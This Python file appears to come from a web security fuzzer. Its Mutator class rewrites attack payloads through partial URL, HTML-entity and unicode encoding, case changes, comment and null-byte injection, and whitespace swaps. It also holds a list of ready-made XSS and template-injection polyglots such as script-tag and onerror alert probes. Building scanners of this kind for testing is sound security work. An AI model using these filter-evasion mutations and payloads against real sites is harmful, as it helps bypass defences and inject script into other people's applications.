import logging
import random
import string
from typing import Optional
from urllib.parse import quote, quote_plus

logger = logging.getLogger(__name__)


class Mutator:
    ENCODING_CHARS = {
        "url": lambda c: quote(c, safe=""),
        "double_url": lambda c: quote(quote(c, safe=""), safe=""),
        "html_entity": lambda c: f"&#{ord(c)};",
        "unicode_escape": lambda c: f"\\u{ord(c):04x}",
        "hex": lambda c: f"\\x{ord(c):02x}",
    }

    WHITESPACE_VARIANTS = [
        (" ", "%20"),
        (" ", "+"),
        (" ", "%09"),
        (" ", "\t"),
        (" ", "\n"),
        (" ", "%0a"),
    ]

    COMMENT_SEQUENCES = [
        "/*",
        "/**/",
        "#",
        "--",
        ";",
        "%00",
    ]

    def __init__(self, max_variants: int = 5):
        self.max_variants = max_variants

    def mutate(self, payload: dict) -> list[dict]:
        original = payload.get("payload_string", "")
        context = payload.get("context", "string")
        variants = []

        variant_count = random.randint(3, self.max_variants)
        applied_mutations = random.sample(
            self._get_applicable_mutations(context),
            min(variant_count, len(self._get_applicable_mutations(context))),
        )

        for mutation_name in applied_mutations:
            mutated = self._apply_mutation(original, mutation_name, context)
            if mutated and mutated != original:
                variant = dict(payload)
                variant["payload_string"] = mutated
                variant["id"] = f"{payload.get('id', '')}-mut-{mutation_name}"
                variant["mutation"] = mutation_name
                variants.append(variant)

        if not variants:
            variants.append(self._create_identity_variant(payload))

        return variants

    def _get_applicable_mutations(self, context: str) -> list[str]:
        base = [
            "url_encoding",
            "double_url_encoding",
            "unicode_encoding",
            "case_manipulation",
            "whitespace_substitution",
        ]
        if context in ("html", "attribute", "template"):
            base.extend(["html_entity_encoding", "comment_injection"])
        if context in ("string", "header", "cookie", "url"):
            base.extend(["null_byte", "comment_injection"])
        if context == "json":
            base.extend(["unicode_escape", "case_manipulation"])
        if context == "xml":
            base.extend(["comment_injection", "null_byte"])
        if context in ("string", "header"):
            base.append("polyglot_generation")
        return base

    def _apply_mutation(
        self, payload: str, mutation: str, context: str
    ) -> str:
        mutators = {
            "url_encoding": self._url_encode,
            "double_url_encoding": self._double_url_encode,
            "html_entity_encoding": self._html_entity_encode,
            "unicode_encoding": self._unicode_encode,
            "case_manipulation": self._case_manipulate,
            "comment_injection": self._inject_comment,
            "null_byte": self._inject_null_byte,
            "whitespace_substitution": self._substitute_whitespace,
            "unicode_escape": self._unicode_escape,
            "polyglot_generation": self._generate_polyglot,
        }
        mutator_fn = mutators.get(mutation)
        if mutator_fn:
            return mutator_fn(payload, context)
        return payload

    def _url_encode(self, payload: str, context: str) -> str:
        chars = list(payload)
        encode_positions = random.sample(
            range(len(chars)),
            min(max(1, len(chars) // 3), len(chars)),
        )
        result = []
        for i, c in enumerate(chars):
            if i in encode_positions and c not in ("<", ">", "'", '"', " "):
                result.append(quote(c, safe=""))
            else:
                result.append(c)
        return "".join(result)

    def _double_url_encode(self, payload: str, context: str) -> str:
        chars = list(payload)
        encode_positions = random.sample(
            range(len(chars)),
            min(max(1, len(chars) // 4), len(chars)),
        )
        result = []
        for i, c in enumerate(chars):
            if i in encode_positions and c not in ("<", ">", "'", '"'):
                result.append(quote(quote(c, safe=""), safe=""))
            else:
                result.append(c)
        return "".join(result)

    def _html_entity_encode(self, payload: str, context: str) -> str:
        special_positions = []
        for i, c in enumerate(payload):
            if c in ("<", ">", "'", '"', "&", "/"):
                special_positions.append(i)

        if not special_positions:
            return payload

        encode_count = random.randint(1, len(special_positions))
        positions_to_encode = random.sample(
            special_positions, encode_count
        )

        result = []
        for i, c in enumerate(payload):
            if i in positions_to_encode:
                result.append(f"&#{ord(c)};")
            else:
                result.append(c)
        return "".join(result)

    def _unicode_encode(self, payload: str, context: str) -> str:
        chars = list(payload)
        encode_positions = random.sample(
            range(len(chars)),
            min(max(1, len(chars) // 3), len(chars)),
        )
        result = []
        for i, c in enumerate(chars):
            if i in encode_positions and c.isalpha():
                result.append(f"\\u{ord(c):04x}")
            else:
                result.append(c)
        return "".join(result)

    def _case_manipulate(self, payload: str, context: str) -> str:
        tag_pattern = self._find_html_tags(payload)
        if tag_pattern:
            return self._manipulate_tag_case(payload, tag_pattern)
        return self._random_case(payload)

    def _find_html_tags(self, payload: str) -> list[tuple[int, int]]:
        import re
        tags = []
        for match in re.finditer(r"<\w+[^>]*>", payload):
            tags.append((match.start(), match.end()))
        return tags

    def _manipulate_tag_case(
        self, payload: str, tags: list[tuple[int, int]]
    ) -> str:
        import re
        result = payload
        for start, end in tags:
            tag = result[start:end]
            case_type = random.choice(["upper", "lower", "mixed"])
            if case_type == "upper":
                new_tag = tag.upper()
            elif case_type == "lower":
                new_tag = tag.lower()
            else:
                new_tag = "".join(
                    c.upper() if i % 2 == 0 else c.lower()
                    for i, c in enumerate(tag)
                )
            result = result[:start] + new_tag + result[end:]
        return result

    def _random_case(self, payload: str) -> str:
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

    def _inject_comment(self, payload: str, context: str) -> str:
        comment = random.choice(self.COMMENT_SEQUENCES)
        words = payload.split()
        if len(words) >= 2:
            insert_pos = random.randint(1, len(words) - 1)
            words.insert(insert_pos, comment)
            return " ".join(words)
        return f"{comment}{payload}"

    def _inject_null_byte(self, payload: str, context: str) -> str:
        null_variants = ["%00", "\\x00", "\\0", "\x00"]
        null = random.choice(null_variants)
        position = random.randint(0, len(payload))
        return payload[:position] + null + payload[position:]

    def _substitute_whitespace(self, payload: str, context: str) -> str:
        result = payload
        space_positions = [
            i for i, c in enumerate(result) if c == " "
        ]
        if not space_positions:
            return result

        substitution = random.choice(self.WHITESPACE_VARIANTS)
        target = substitution[0]
        replacement = substitution[1]

        pos = random.choice(space_positions)
        result = result[:pos] + replacement + result[pos + 1:]
        return result

    def _unicode_escape(self, payload: str, context: str) -> str:
        result = []
        for c in payload:
            if random.random() > 0.6 and c.isalpha():
                result.append(f"\\u{ord(c):04x}")
            else:
                result.append(c)
        return "".join(result)

    def _generate_polyglot(self, payload: str, context: str) -> str:
        polyglots = [
            f"jaVasCrIpt:/*-/*`/*\\'/*\"/*/**/(/* */oNcLiCk=alert() )//",
            f"'-alert(1)-'",
            f"<img src=x onerror=alert(1)//",
            f"javascript:alert(1)",
            f"\"><script>alert(1)</script>",
            f"';alert(1)//",
            f"}};alert(1)//",
            f"{{constructor.constructor('alert(1)')()}}",
        ]
        return random.choice(polyglots)

    def _create_identity_variant(self, payload: dict) -> dict:
        variant = dict(payload)
        original = payload.get("payload_string", "")
        if original:
            prefix = random.choice(["", " ", "\t", "%20"])
            suffix = random.choice(["", " ", "\t", "%20"])
            variant["payload_string"] = f"{prefix}{original}{suffix}"
            variant["id"] = f"{payload.get('id', '')}-mut-identity"
            variant["mutation"] = "identity_whitespace"
        return variant

    def mutate_batch(
        self, payloads: list[dict], count_per_payload: int = 3
    ) -> list[dict]:
        all_variants = []
        for payload in payloads:
            original_variant = dict(payload)
            original_variant["mutation"] = "original"
            all_variants.append(original_variant)

            old_max = self.max_variants
            self.max_variants = count_per_payload
            variants = self.mutate(payload)
            self.max_variants = old_max
            all_variants.extend(variants)

        random.shuffle(all_variants)
        return all_variants
